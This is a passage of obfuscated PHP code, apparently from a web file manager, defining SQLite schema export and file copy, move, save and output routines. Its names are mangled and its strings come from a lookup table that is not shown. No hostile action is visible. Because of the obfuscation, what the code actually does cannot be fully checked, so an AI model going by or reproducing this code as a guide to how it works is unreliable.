$úØ¨ŸÔ¼[$ªÔÇ½š‚[1192]]) . $ªÔÇ½š‚[1204]); $¤ÆÖè ¨[] = implode($ªÔÇ½š‚[53], $´†¾´œÀ) . $ªÔÇ½š‚[74]; } $«ä¼€óõ = array(); $¸é³©ªğ = array($ªÔÇ½š‚[1205] => $ªÔÇ½š‚[1206], $ªÔÇ½š‚[1206] => $ªÔÇ½š‚[1206], $ªÔÇ½š‚[364] => $ªÔÇ½š‚[391], $ªÔÇ½š‚[363] => $ªÔÇ½š‚[391]); foreach ($öîŸĞ³Ò as $úØ¨ŸÔ¼) { $´†¾´œÀ = array($ªÔÇ½š‚[121] . $úØ¨ŸÔ¼[$ªÔÇ½š‚[1207]] . $ªÔÇ½š‚[121], isset($¸é³©ªğ[$úØ¨ŸÔ¼[$ªÔÇ½š‚[1208]]]) ? $¸é³©ªğ[$úØ¨ŸÔ¼[$ªÔÇ½š‚[1208]]] : $úØ¨ŸÔ¼[$ªÔÇ½š‚[1209]], $úØ¨ŸÔ¼[$ªÔÇ½š‚[1210]] == $ªÔÇ½š‚[983] ? $ªÔÇ½š‚[1211] : $ªÔÇ½š‚[1212], $úØ¨ŸÔ¼[$ªÔÇ½š‚[1207]] == $¿õãÊò½ ? $ªÔÇ½š‚[1213] : $ªÔÇ½š‚[12], $úØ¨ŸÔ¼[$ªÔÇ½š‚[1034]] ? strtoupper(str_replace($ªÔÇ½š‚[11], $ªÔÇ½š‚[12], $úØ¨ŸÔ¼[$ªÔÇ½š‚[1034]])) : $ªÔÇ½š‚[12]); $«ä¼€óõ[] = trim(implode($ªÔÇ½š‚[53], $´†¾´œÀ)); } $¼–•éè‹ = array($ªÔÇ½š‚[1214] . $ø‰§ö . $ªÔÇ½š‚[1215], $ªÔÇ½š‚[1216] . $ø‰§ö . $ªÔÇ½š‚[1217], implode($ªÔÇ½š‚[50] . PHP_EOL, $«ä¼€óõ), $ªÔÇ½š‚[1031]); $Ù˜£ßİé = implode(PHP_EOL, array_merge($¼–•éè‹, $¤ÆÖè ¨)); if ($‹Îçô€Ã && $‹Îçô€Ã == $ªÔÇ½š‚[13]) { return $Ù˜£ßİé; } $êáÉ‰¿ = array($ªÔÇ½š‚[882] => $İæÊÉÒ´, $ªÔÇ½š‚[13] => $Ù˜£ßİé); return $‹Îçô€Ã ? $êáÉ‰¿[$‹Îçô€Ã] : $êáÉ‰¿; } public function sqlFromSqlite($Ã²ğßÃ„, $¬§“Í·È = '') { $®Š±×ì­ =& $_SERVER[¿ğÚ‰±–]; $ÚÛ´ß—í = $this->model()->db(); $äûéÍ»ğ = "\x50\x52\101\107\x4d\101\40\124\x41\x42\114\x45\x5f\x49\116\106\117\x20\x28\47{$Ã²ğßÃ„}\47\x29"; $¡›Ùßó = "\123\105\114\x45\x43\124\40\x2a\40\106\x52\117\x4d\40\x73\x71\x6c\151\164\x65\137\x6d\141\163\x74\x65\x72\40\127\x48\x45\x52\105\x20\164\142\154\137\x6e\x61\155\x65\x20\75\x20\x27{$Ã²ğßÃ„}\x27"; $„ö‹¹ØÂ = $ÚÛ´ß—í->query($äûéÍ»ğ); if (empty($„ö‹¹ØÂ)) { $Íá¼¼ÚÆ = array($®Š±×ì­[882] => $®Š±×ì­[12], $®Š±×ì­[13] => $®Š±×ì­[12]); return $¬§“Í·È ? $Íá¼¼ÚÆ[$¬§“Í·È] : $Íá¼¼ÚÆ; } $ª¬ùñÊ¹ = $ÚÛ´ß—í->query($¡›Ùßó); $ŒÄ…ßí = $áñÛ— É = array(); foreach ($ª¬ùñÊ¹ as $ş×È°Ğ™) { if ($ş×È°Ğ™[$®Š±×ì­[33]] == $®Š±×ì­[356]) { $ŒÄ…ßí[] = $ş×È°Ğ™[$®Š±×ì­[1218]]; } else { $áñÛ— É[$ş×È°Ğ™[$®Š±×ì­[32]]] = $ş×È°Ğ™[$®Š±×ì­[1218]]; } } $¦ûĞ¨µ = array_merge(array($®Š±×ì­[1214] . $Ã²ğßÃ„ . $®Š±×ì­[121]), $ŒÄ…ßí, array_values($áñÛ— É)); $¦ûĞ¨µ = implode($®Š±×ì­[74] . PHP_EOL, $¦ûĞ¨µ) . $®Š±×ì­[74]; if ($¬§“Í·È && $¬§“Í·È == $®Š±×ì­[13]) { return $¦ûĞ¨µ; } $Ö»ÔÙŸ” = array(); $›Ÿåñ á = array($®Š±×ì­[1206] => $®Š±×ì­[1219], $®Š±×ì­[391] => $®Š±×ì­[1220]); $ªĞ°Æ˜ = $®Š±×ì­[12]; foreach ($„ö‹¹ØÂ as $ş×È°Ğ™) { if ($ş×È°Ğ™[$®Š±×ì­[57]] == $®Š±×ì­[91]) { $ªĞ°Æ˜ = $ş×È°Ğ™[$®Š±×ì­[32]]; } $Åå§ğ×± = array($®Š±×ì­[461] . $ş×È°Ğ™[$®Š±×ì­[32]] . $®Š±×ì­[461], isset($›Ÿåñ á[$ş×È°Ğ™[$®Š±×ì­[33]]]) ? $›Ÿåñ á[$ş×È°Ğ™[$®Š±×ì­[33]]] : $ş×È°Ğ™[$®Š±×ì­[33]], $ş×È°Ğ™[$®Š±×ì­[35]] == $®Š±×ì­[91] ? $®Š±×ì­[1211] : $®Š±×ì­[1221] . $ş×È°Ğ™[$®Š±×ì­[56]], $ş×È°Ğ™[$®Š±×ì­[57]] == $®Š±×ì­[91] ? $®Š±×ì­[1222] : $®Š±×ì­[12]); $Ö»ÔÙŸ”[] = trim(implode($®Š±×ì­[53], $Åå§ğ×±)); } foreach ($áñÛ— É as $Œ×ÊàÇ => $ëàŠ‡ü°) { $œªŞ£¢Ë = str_replace($®Š±×ì­[1223] . $Ã²ğßÃ„ . $®Š±×ì­[11], $®Š±×ì­[12], $Œ×ÊàÇ); $š•Ò¢·× = str_replace(array($®Š±×ì­[121], $®Š±×ì­[1042]), $®Š±×ì­[461], substr($ëàŠ‡ü°, stripos($ëàŠ‡ü°, $®Š±×ì­[337]))); if ($œªŞ£¢Ë == $®Š±×ì­[1200]) { $ºÓşÆïµ = $®Š±×ì­[1224] . $ªĞ°Æ˜ . $®Š±×ì­[1225]; } else { $ºÓşÆïµ = (stripos($œªŞ£¢Ë, $®Š±×ì­[11]) ? $®Š±×ì­[1226] : $®Š±×ì­[12]) . ($®Š±×ì­[1227] . $œªŞ£¢Ë . $®Š±×ì­[1228] . $š•Ò¢·×); } $Ö»ÔÙŸ”[] = $ºÓşÆïµ; } $ìĞûœˆ = array($®Š±×ì­[1229] . $Ã²ğßÃ„ . $®Š±×ì­[1230], $®Š±×ì­[1231] . $Ã²ğßÃ„ . $®Š±×ì­[1232], implode($®Š±×ì­[50] . PHP_EOL, $Ö»ÔÙŸ”), $®Š±×ì­[1233]); $··ı‰¯” = implode(PHP_EOL, $ìĞûœˆ); if ($¬§“Í·È && $¬§“Í·È == $®Š±×ì­[882]) { return $··ı‰¯”; } $Íá¼¼ÚÆ = array($®Š±×ì­[882] => $··ı‰¯”, $®Š±×ì­[13] => $¦ûĞ¨µ); return $¬§“Í·È ? $Íá¼¼ÚÆ[$¬§“Í·È] : $Íá¼¼ÚÆ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Ø¦ÄÕ½¿, $ö„¨«®…) { $§ĞÔ©ıÖ =& $_SERVER[¿ğÚ‰±–]; $œ¸üœ Å = $ö„¨«®…; $GLOBALS[$§ĞÔ©ıÖ[1234]] = $§ĞÔ©ıÖ[1235] . $Ø¦ÄÕ½¿; Hook::trigger($§ĞÔ©ıÖ[1235] . $Ø¦ÄÕ½¿ . $§ĞÔ©ıÖ[1236], $œ¸üœ Å); $¤’Êµîö = self::driverMake($ö„¨«®…[0]); if (!$¤’Êµîö) { return !1; } if (method_exists($¤’Êµîö, $Ø¦ÄÕ½¿)) { $ÃÉüĞ¸ê = @call_user_func_array(array($¤’Êµîö, $Ø¦ÄÕ½¿), $ö„¨«®…); } else { if (method_exists($¤’Êµîö, $§ĞÔ©ıÖ[1237])) { $ÃÉüĞ¸ê = @call_user_func_array(array($¤’Êµîö, $Ø¦ÄÕ½¿), $ö„¨«®…); } else { if (method_exists(self, $Ø¦ÄÕ½¿)) { $ÃÉüĞ¸ê = @call_user_func_array(array(self, $Ø¦ÄÕ½¿), $ö„¨«®…); } else { $ÃÉüĞ¸ê = call_user_func_array(array(parent, $Ø¦ÄÕ½¿), $ö„¨«®…); } } } Hook::trigger($§ĞÔ©ıÖ[1235] . $Ø¦ÄÕ½¿ . $§ĞÔ©ıÖ[1238], $œ¸üœ Å, $ÃÉüĞ¸ê); return $ÃÉüĞ¸ê; } public static function init($æ¥ö¾€Ï) { return self::driverMake($æ¥ö¾€Ï); } public static function copy($Üßõåîâ, $À¹è­à­, $Ãˆ¯“â» = false, $ë† µ¬ = false) { return self::copyMoveStart($Üßõåîâ, $À¹è­à­, $Ãˆ¯“â», $_SERVER[¿ğÚ‰±–][618], $ë† µ¬); } public static function move($¯æ”å—, $¶¦ø®ë, $ÏÆ¬Î£ = false, $Ôßğ¿¹À = false) { return self::copyMoveStart($¯æ”å—, $¶¦ø®ë, $ÏÆ¬Î£, $_SERVER[¿ğÚ‰±–][620], $Ôßğ¿¹À); } private static function copyMoveStart($¦ÇÆåÆö, $Ÿƒôºî, $ğ²Ã•ö¶, $•²®·¼, $ÔµùÁ¼æ) { $ãŠ§´æú =& $_SERVER[¿ğÚ‰±–]; $›Ş’º¶é = array($¦ÇÆåÆö, $Ÿƒôºî, $ğ²Ã•ö¶, $ÔµùÁ¼æ); Hook::trigger($ãŠ§´æú[1235] . $•²®·¼ . $ãŠ§´æú[1236], $›Ş’º¶é); $‰›—äü² = self::copyMove($¦ÇÆåÆö, $Ÿƒôºî, $ğ²Ã•ö¶, $•²®·¼, $ÔµùÁ¼æ); Hook::trigger($ãŠ§´æú[1235] . $•²®·¼ . $ãŠ§´æú[1238], $›Ş’º¶é, $‰›—äü²); return $‰›—äü²; } public static function saveFile($Ñõõ¬“ù, $ØÃÑÖ”µ, $¸’„šİË = true) { $ƒºãŸØ¯ =& $_SERVER[¿ğÚ‰±–]; $õŒ°ˆ¦¦ = self::info($ØÃÑÖ”µ); $¾¹ä•Ú§ = self::driverMake($Ñõõ¬“ù); $”Ò­Ñ¥ = self::driverMake($ØÃÑÖ”µ); $¬œÛ—ï = !1; if ($”Ò­Ñ¥->pathParse[$ƒºãŸØ¯[1239]]) { $¬œÛ—ï = $”Ò­Ñ¥; $ä’ı’ë¬ = $”Ò­Ñ¥->pathParse[$ƒºãŸØ¯[1239]]; $”Ò­Ñ¥ = self::driverMake($ä’ı’ë¬); } if ($¾¹ä•Ú§->pathParse[$ƒºãŸØ¯[1239]]) { $äâøã¹ì = $¾¹ä•Ú§->pathParse[$ƒºãŸØ¯[1239]]; $¾¹ä•Ú§ = self::driverMake($äâøã¹ì); } $êéÚï£» = $”Ò­Ñ¥->pathFather($ØÃÑÖ”µ); $üÏÀàµ» = !0; if (!$¸’„šİË && self::driverIsSame($¾¹ä•Ú§, $”Ò­Ñ¥)) { $üÏÀàµ» = !1; } $‹Ë€° = self::copyFile($¾¹ä•Ú§, $Ñõõ¬“ù, $”Ò­Ñ¥, $êéÚï£», $õŒ°ˆ¦¦[$ƒºãŸØ¯[32]], $üÏÀàµ»); if ($¬œÛ—ï) { $‹Ë€° = $¬œÛ—ï->getPathOuter($‹Ë€°); } return $‹Ë€°; } private static function copyMove($°ğ–‡¥Ó, $ıøş©Íî, $ã€Ç–¿×, $¨Ùõ¢á, $­íÁ”Š¢ = false) { $ÂÎ±Å– =& $_SERVER[¿ğÚ‰±–]; if (!$°ğ–‡¥Ó || $°ğ–‡¥Ó == $ÂÎ±Å–[8] || !$ıøş©Íî) { return !1; } ignore_timeout(); $ğñ©¬¥ı = self::driverMake($°ğ–‡¥Ó); $öÅÉç× = self::driverMake($ıøş©Íî); $„ì¤à´‰ = $¨Ùõ¢á == $ÂÎ±Å–[620]; $Ñ¯ò«´‹ = !1; if ($öÅÉç×->pathParse[$ÂÎ±Å–[1239]]) { $Ñ¯ò«´‹ = $öÅÉç×; $ıøş©Íî = $öÅÉç×->pathParse[$ÂÎ±Å–[1239]]; $öÅÉç× = self::driverMake($ıøş©Íî); } if ($ğñ©¬¥ı->pathParse[$ÂÎ±Å–[1239]]) { $°ğ–‡¥Ó = $ğñ©¬¥ı->pathParse[$ÂÎ±Å–[1239]]; $ğñ©¬¥ı = self::driverMake($°ğ–‡¥Ó); } self::check($ğñ©¬¥ı, $°ğ–‡¥Ó, $öÅÉç×, $ıøş©Íî); Hook::trigger($ÂÎ±Å–[1240], $ğñ©¬¥ı, $°ğ–‡¥Ó, $öÅÉç×, $ıøş©Íî); $‡Ï³Üöä = self::driverIsSame($ğñ©¬¥ı, $öÅÉç×); if ($‡Ï³Üöä) { if ($¨Ùõ¢á == $ÂÎ±Å–[620] && !method_exists($öÅÉç×, $ÂÎ±Å–[1241]) && trim($ıøş©Íî, $ÂÎ±Å–[8]) == trim($öÅÉç×->pathFather($°ğ–‡¥Ó), $ÂÎ±Å–[8])) { if ($ğñ©¬¥ı->pathThis($°ğ–‡¥Ó) != $­íÁ”Š¢ && !$ğñ©¬¥ı->isOsDriver()) { return $ğñ©¬¥ı->rename($°ğ–‡¥Ó, $­íÁ”Š¢); } return $öÅÉç×->getPathOuter($°ğ–‡¥Ó); } if (method_exists($öÅÉç×, $¨Ùõ¢á)) { return $öÅÉç×->{$¨Ùõ¢á}($°ğ–‡¥Ó, $ıøş©Íî, $ã€Ç–¿×, $­íÁ”Š¢); } } if ($‡Ï³Üöä && $¨Ùõ¢á == $ÂÎ±Å–[620] && $öÅÉç×->getType() == $ÂÎ±Å–[109]) { $ãºÎÏÛ¸ = $öÅÉç×->movePath($°ğ–‡¥Ó, $ıøş©Íî, $­íÁ”Š¢); if ($ãºÎÏÛ¸) { return $ãºÎÏÛ¸; } } $›üŞßŠ = $ğñ©¬¥ı->isFile($°ğ–‡¥Ó); if (!$›üŞßŠ && $öÅÉç×->getType() == $ÂÎ±Å–[835] && $ğñ©¬¥ı->getType() == $ÂÎ±Å–[109]) { $ãºÎÏÛ¸ = $öÅÉç×->copyFolderFromIO($ğñ©¬¥ı, $°ğ–‡¥Ó, $ıøş©Íî, $ã€Ç–¿×, $„ì¤à´‰, $­íÁ”Š¢); } else { $ãºÎÏÛ¸ = self::copyPath($ğñ©¬¥ı, $°ğ–‡¥Ó, $öÅÉç×, $ıøş©Íî, $ã€Ç–¿×, $„ì¤à´‰, $›üŞßŠ, $­íÁ”Š¢); } if ($ãºÎÏÛ¸ && $„ì¤à´‰) { $ğñ©¬¥ı->remove($°ğ–‡¥Ó); } if ($Ñ¯ò«´‹) { $ãºÎÏÛ¸ = $Ñ¯ò«´‹->getPathOuter($ãºÎÏÛ¸); } return $ãºÎÏÛ¸; } private static function check($Şï¦à‚, $»¾ï€Ö, $ª«øÑª, &$üÀŠôĞ™) { $Š’óã¼• =& $_SERVER[¿ğÚ‰±–]; if (self::driverIsSame($Şï¦à‚, $ª«øÑª) && $Şï¦à‚->isFolder($»¾ï€Ö) && $Şï¦à‚->isParentOf($»¾ï€Ö, $üÀŠôĞ™)) { show_json(LNG($Š’óã¼•[1242]), !1); } if (!$Şï¦à‚->exist($»¾ï€Ö)) { show_json(LNG($Š’óã¼•[108]), !1); } } private static function copyPath($«¤ÏÓÓ, $Ä±ƒ‹Û©, $Ç½á„Ô, $ú¹Ã·¬¶, $ÌøçÚ‚˜, $ŒÏæÍÌ¥, $¥ƒôäûÆ, $õÂ±Ü«¤ = false, $üŠÃ¢« = true) { $Æ·ÜÈìÑ =& $_SERVER[¿ğÚ‰±–]; $ş¿¯¹´ = empty($õÂ±Ü«¤) && $õÂ±Ü«¤ !== $Æ·ÜÈìÑ[228] ? $«¤ÏÓÓ->pathThis($Ä±ƒ‹Û©) : $õÂ±Ü«¤; if ($ÌøçÚ‚˜) { $æğ†Áä• = $Ç½á„Ô->fileNameExist($ú¹Ã·¬¶, $ş¿¯¹´); $öÍ½›¢ = $ş¿¯¹´; $ş¿¯¹´ = $Ç½á„Ô->fileNameAuto($ú¹Ã·¬¶, $ş¿¯¹´, $ÌøçÚ‚˜, !$¥ƒôäûÆ); if (!$æğ†Áä• || $öÍ½›¢ != $ş¿¯¹´) { $ÌøçÚ‚˜ = !1; } if ($üŠÃ¢« && !$ÌøçÚ‚˜) { $Ç½á„Ô->_data[$Æ·ÜÈìÑ[1243]] = !0; } } if ($¥ƒôäûÆ) { return self::copyFile($«¤ÏÓÓ, $Ä±ƒ‹Û©, $Ç½á„Ô, $ú¹Ã·¬¶, $ş¿¯¹´, $ŒÏæÍÌ¥); } if ($ÌøçÚ‚˜ == REPEAT_RENAME_FOLDER) { $ÌøçÚ‚˜ = !1; } $äùÉ³èŒ = rtrim($ú¹Ã·¬¶, $Æ·ÜÈìÑ[8]) . $Æ·ÜÈìÑ[8] . $ş¿¯¹´; $ç³şŒş = $Ç½á„Ô->mkdir($Ç½á„Ô->getPath($äùÉ³èŒ), $ÌøçÚ‚˜); $ú¹Ã·¬¶ = $Ç½á„Ô->getPathInner($ç³şŒş); $ĞÄûœœ = $«¤ÏÓÓ->listPath($Ä±ƒ‹Û©, !0); $ĞÄûœœ = is_array($ĞÄûœœ) ? $ĞÄûœœ : array($Æ·ÜÈìÑ[86] => array(), $Æ·ÜÈìÑ[85] => array()); $Šê£›ş = array_merge($ĞÄûœœ[$Æ·ÜÈìÑ[86]], $ĞÄûœœ[$Æ·ÜÈìÑ[85]]); foreach ($Šê£›ş as $µøËïÏè) { $Ôûö•³¤ = $µøËïÏè[$Æ·ÜÈìÑ[33]] == $Æ·ÜÈìÑ[230]; $Ä±ƒ‹Û© = $«¤ÏÓÓ->getPathInner($µøËïÏè[$Æ·ÜÈìÑ[87]]); $€Á¨áú = self::copyPath($«¤ÏÓÓ, $Ä±ƒ‹Û©, $Ç½á„Ô, $ú¹Ã·¬¶, $ÌøçÚ‚˜, $ŒÏæÍÌ¥, $Ôûö•³¤, !1, !1); if (!$€Á¨áú) { IO::errorTips($Æ·ÜÈìÑ[1244] . $Ä±ƒ‹Û© . $Æ·ÜÈìÑ[73] . $ú¹Ã·¬¶); } } self::copyMoveKeepInfo($«¤ÏÓÓ, $Ä±ƒ‹Û©, $ç³şŒş); return $ç³şŒş; } private static function copyFile($å¿Ş½ĞÊ, $¹ñØÅ , $ÍÓ¿Šßñ, $¼Óêş÷Ì, $ÁÎ»Œ›­, $Æ«’ï©) { $úâ·ëæ =& $_SERVER[¿ğÚ‰±–]; $¼Óêş÷Ì = $ÍÓ¿Šßñ->getPath(rtrim($¼Óêş÷Ì, $úâ·ëæ[8]) . $úâ·ëæ[8] . $ÁÎ»Œ›­); $š›ŸËÙÛ = $úâ·ëæ[1245] . time() . rand_string(5); Hook::trigger($úâ·ëæ[1246], $å¿Ş½ĞÊ, $¹ñØÅ , $ÍÓ¿Šßñ, $¼Óêş÷Ì, $ÁÎ»Œ›­, $š›ŸËÙÛ); if (self::driverIsSame($å¿Ş½ĞÊ, $ÍÓ¿Šßñ)) { if ($Æ«’ï©) { $öÚñÑ¬÷ = $ÍÓ¿Šßñ->moveFile($¹ñØÅ , $¼Óêş÷Ì); } else { $öÚñÑ¬÷ = $ÍÓ¿Šßñ->copyFile($¹ñØÅ , $¼Óêş÷Ì); } Hook::trigger($úâ·ëæ[1247], $å¿Ş½ĞÊ, $¹ñØÅ , $ÍÓ¿Šßñ, $¼Óêş÷Ì, $ÁÎ»Œ›­, $öÚñÑ¬÷); self::copyMoveKeepInfo($å¿Ş½ĞÊ, $¹ñØÅ , $öÚñÑ¬÷); return $öÚñÑ¬÷; } $¯îĞ„Õí = TEMP_FILES; if ($GLOBALS[$úâ·ëæ[6]][$úâ·ëæ[92]][$úâ·ëæ[874]]) { $¯îĞ„Õí = $GLOBALS[$úâ·ëæ[6]][$úâ·ëæ[92]][$úâ·ëæ[874]]; } $ÒãÃ™Ëâ = $¯îĞ„Õí; mk_dir($ÒãÃ™Ëâ); $ê“Â¤©Ì = $ÒãÃ™Ëâ . $š›ŸËÙÛ; $…¯ş†Ê = $ê“Â¤©Ì; $ê“Â¤©Ì = $å¿Ş½ĞÊ->download($¹ñØÅ , $ê“Â¤©Ì); $ê“Â¤©Ì = $å¿Ş½ĞÊ->iconvApp($ê“Â¤©Ì); if (substr($ê“Â¤©Ì, strlen($¯îĞ„Õí)) == $¯îĞ„Õí) { $Æ«’ï© = !0; } $öÚñÑ¬÷ = $ÍÓ¿Šßñ->upload($¼Óêş÷Ì, $ê“Â¤©Ì, $Æ«’ï©); self::remove($…¯ş†Ê); Hook::trigger($úâ·ëæ[1247], $å¿Ş½ĞÊ, $¹ñØÅ , $ÍÓ¿Šßñ, $¼Óêş÷Ì, $ÁÎ»Œ›­, $öÚñÑ¬÷); self::copyMoveKeepInfo($å¿Ş½ĞÊ, $¹ñØÅ , $öÚñÑ¬÷); return $öÚñÑ¬÷; } private static function copyMoveKeepInfo($¹£ÈĞ¬¨, $Ş ûğĞ , $é£ú¼¬ğ) { if (!$é£ú¼¬ğ) { return; } $ˆ¿ëüÍ = $¹£ÈĞ¬¨->info($Ş ûğĞ ); if (!is_array($ˆ¿ëüÍ)) { return; } IO::setModifyTime($é£ú¼¬ğ, $ˆ¿ëüÍ[$_SERVER[¿ğÚ‰±–][88]]); } public static function pathFather($®äÅ²ïâ) { $ºÆ²Õúä = IO::init($®äÅ²ïâ); $ˆÕ’š™œ = $ºÆ²Õúä->pathFather($ºÆ²Õúä->path); return $ºÆ²Õúä->getPathOuter($ˆÕ’š™œ); } public static function fileOut($°ééÃš, $°âˆÄùé = false, $ğøÏ ü” = false, $©Ÿ×‚ªÈ = '') { $ş¼ä°³ = self::driverMake($°ééÃš); if ($ş¼ä°³->isFileOutServer()) { return $ş¼ä°³->fileOutServer($°ééÃš, $°âˆÄùé, $ğøÏ ü”, $©Ÿ×‚ªÈ); } return $ş¼ä°³->fileOut($°ééÃš, $°âˆÄùé, $ğøÏ ü”, $©Ÿ×‚ªÈ); } public static function fileOutImage($å”™Óö, $¼ÁŒçØˆ = 250) { $õ¸£Ïß˜ = array(250, 600, 1200, 2000, 3000, 5000); for ($ëÎ‡·É‚ = 0; $ëÎ‡·É‚ < count($õ¸£Ïß˜); $ëÎ‡·É‚++) { if ($ëÎ‡·É‚ == 0 && $¼ÁŒçØˆ <= $õ¸£Ïß˜[$ëÎ‡·É‚]) { $¼ÁŒçØˆ = $õ¸£Ïß˜[$ëÎ‡·É‚]; break; } else { if ($¼ÁŒçØˆ > $õ¸£Ïß˜[$ëÎ‡·É‚ - 1] && $¼ÁŒçØˆ <= $õ¸£Ïß˜[$ëÎ‡·É‚]) { $¼ÁŒçØˆ = $õ¸£Ïß˜[$ëÎ‡·É‚]; break; } else { if ($ëÎ‡·É‚ == count($õ¸£Ïß˜) - 1 && $¼ÁŒçØˆ > $õ¸£Ïß˜[$ëÎ‡·É‚]) { $¼ÁŒçØˆ = $õ¸£Ïß˜[$ëÎ‡·É‚]; break; } } } } $”Ï ‰Îê = self::driverMake($å”™Óö); if ($”Ï ‰Îê->isFileOutServer()) { return $”Ï ‰Îê->fileOutImageServer($å”™Óö, $¼ÁŒçØˆ); } return $”Ï ‰Îê->fileOutImage($å”™Óö, $¼ÁŒçØˆ); } private static function driverIsSame($ê£“—È…, $ğ¸™Ã¿§) { $°Ü•Šæ­ =& $_SERVER[¿ğÚ‰±–]; $¦ñ£øŞª = $ê£“—È…->getType(); $ÄÑŒ™è = $ğ¸™Ã¿§->getType(); if ($¦ñ£øŞª != $ÄÑŒ™è) { return !1; } if ($¦ñ£øŞª == $°Ü•Šæ­[835]) { return !0; } if ($¦ñ£øŞª == $°Ü•Šæ­[109]) { return !0; } if ($ê£“—È…->pathDriver == $ğ¸™Ã¿§->pathDriver) { return !0; } return !1; } public static function copyUpdate($¶éªÏ¶, $òÛ¦“‡) { $ãã“Ù… =& $_SERVER[¿ğÚ‰±–]; if (!IO::exist($¶éªÏ¶)) { return !1; } if (!IO::exist($òÛ¦“‡)) { IO::mkdir($òÛ¦“‡); } $©Ñçß— = array_to_keyvalue(self::listAllSimple($¶éªÏ¶), $ãã“Ù…[87]); $î—üÙİï = array_to_keyvalue(self::listAllSimple($òÛ¦“‡), $ãã“Ù…[87]); $ÄÆÏÇŞ‡ = array(); $áà¨áûÏ = array(); foreach ($©Ñçß— as $á›éß´ => $Õ¬š”´Œ) { if (isset($î—üÙİï[$á›éß´])) { if ($Õ¬š”´Œ[$ãã“Ù…[78]] == 1) { continue; } if ($î—üÙİï[$á›éß´][$ãã“Ù…[79]] == $Õ¬š”´Œ[$ãã“Ù…[79]]) { continue; } } if ($Õ¬š”´Œ[$ãã“Ù…[78]] == 1) { $áà¨áûÏ[] = $òÛ¦“‡ . $ãã“Ù…[8] . trim($á›éß´, $ãã“Ù…[8]); continue; } $Ş’–Ûµ = strstr(trim($á›éß´, $ãã“Ù…[8]), $ãã“Ù…[8]) ? get_path_father($á›éß´) : $ãã“Ù…[12]; $ÄÆÏÇŞ‡[] = array($ãã“Ù…[1248] => $Õ¬š”´Œ[$ãã“Ù…[89]], $ãã“Ù…[1249] => rtrim($òÛ¦“‡, $ãã“Ù…[8]) . $ãã“Ù…[8] . $Ş’–Ûµ, $ãã“Ù…[1250] => $Õ¬š”´Œ); } $Æ“ËÄÁ£ = array($ãã“Ù…[230] => $ÄÆÏÇŞ‡, $ãã“Ù…[78] => $áà¨áûÏ); Hook::trigger($ãã“Ù…[1251], $¶éªÏ¶, $òÛ¦“‡, $Æ“ËÄÁ£); foreach ($áà¨áûÏ as $Õ¬š”´Œ) { IO::mkdir($Õ¬š”´Œ); } foreach ($ÄÆÏÇŞ‡ as $Õ¬š”´Œ) { IO::copy($Õ¬š”´Œ[$ãã“Ù…[1248]], $Õ¬š”´Œ[$ãã“Ù…[1249]], REPEAT_REPLACE); } } public static function fileSubstr($é‡ö»ğµ, $¤ÌğıÎ÷, $ù“•æô‚ = false) { $Ó¯ÃŸ¨à =& $_SERVER[¿ğÚ‰±–]; $ø¢²›òŒ = self::driverMake($é‡ö»ğµ); $Ò‚­Ø×Ú = $ø¢²›òŒ->size($é‡ö»ğµ); $µ÷…Ì† = $¤ÌğıÎ÷; $¬á’ù¬’ = $ù“•æô‚; if ($¤ÌğıÎ÷ < 0) { $¤ÌğıÎ÷ = $Ò‚­Ø×Ú + $¤ÌğıÎ÷; } if ($ù“•æô‚ === !1) { $ù“•æô‚ = $Ò‚­Ø×Ú - $¤ÌğıÎ÷; } if ($¤ÌğıÎ÷ + $ù“•æô‚ > $Ò‚­Ø×Ú) { $ù“•æô‚ = $Ò‚­Ø×Ú - $¤ÌğıÎ÷; } if (!$Ò‚­Ø×Ú && $ø¢²›òŒ->getType() == $Ó¯ÃŸ¨à[109] && !$ø¢²›òŒ->exist($é‡ö»ğµ)) { $äÈ·äâÀ = get_path_this($é‡ö»ğµ); $é œ“ÅÇ = parse_url_query($äÈ·äâÀ); if (is_array($é œ“ÅÇ) && isset($é œ“ÅÇ[$Ó¯ÃŸ¨à[32]])) { $äÈ·äâÀ = urldecode($é œ“ÅÇ[$Ó¯ÃŸ¨à[32]]); } throw new Exception($Ó¯ÃŸ¨à[1252] . LNG($Ó¯ÃŸ¨à[1253]) . $Ó¯ÃŸ¨à[1051] . clear_html($äÈ·äâÀ) . $Ó¯ÃŸ¨à[12]); } if ($ù“•æô‚ <= 0) { return $Ó¯ÃŸ¨à[12]; } if ($¤ÌğıÎ÷ < 0 || $¤ÌğıÎ÷ >= $Ò‚­Ø×Ú || $ù“•æô‚ > 1024 * 1024 * 10) { throw new Exception("\146\151\x6c\145\x52\145\141\144\40\x65\x72\x72\157\162\41\x20\x73\x74\x61\162\x74\75{$¤ÌğıÎ÷}\73\x6c\145\x6e\147\x74\150\x3d{$ù“•æô‚}\73\x20\163\151\x7a\x65\x3d{$Ò‚­Ø×Ú}\73"); } $£ûƒõ½± = $ø¢²›òŒ->fileSubstr($é‡ö»ğµ, $¤ÌğıÎ÷, $ù“•æô‚); if (!$£ûƒõ½± && $ù“•æô‚ && isset($GLOBALS[$Ó¯ÃŸ¨à[1254]])) { throw new Exception($GLOBALS[$Ó¯ÃŸ¨à[1254]][$Ó¯ÃŸ¨à[1255]]); } return $£ûƒõ½±; } private static function driverMake(&$„šƒã‘) { $ªÈ‰ üˆ =& $_SERVER[¿ğÚ‰±–]; $¤±›¦ÊÌ = KodIO::parse($„šƒã‘); if (!self::$driverListSystem) { $ç€Éò† = Model($ªÈ‰ üˆ[845])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ç€Éò†, $ªÈ‰ üˆ[475]); } if ($¤±›¦ÊÌ[$ªÈ‰ üˆ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$¤±›¦ÊÌ[$ªÈ‰ üˆ[475]]]) { throw new Exception($ªÈ‰ üˆ[1256]); return !1; } $„šƒã‘ = $¤±›¦ÊÌ[$ªÈ‰ üˆ[1257]]; $®…Èß±­ = self::driverGet($¤±›¦ÊÌ, $„šƒã‘); return $®…Èß±­; } private static function driverGet($›¸®Ä¯‘, &$æÜñª†›) { $®–ëß =& $_SERVER[¿ğÚ‰±–]; $¾ûÄ¢¬† = $›¸®Ä¯‘[$®–ëß[1258]]; $ãš™òÌ = $›¸®Ä¯‘[$®–ëß[475]]; switch ($›¸®Ä¯‘[$®–ëß[33]]) { case KodIO::KOD_IO: $ÆÅö¿ºÆ = self::$driverListSystem[$ãš™òÌ]; break; case KodIO::KOD_SOURCE: $æÜñª†› = $ãš™òÌ . $æÜñª†›; $ÆÅö¿ºÆ = array($®–ëß[1259] => $®–ëß[1260], 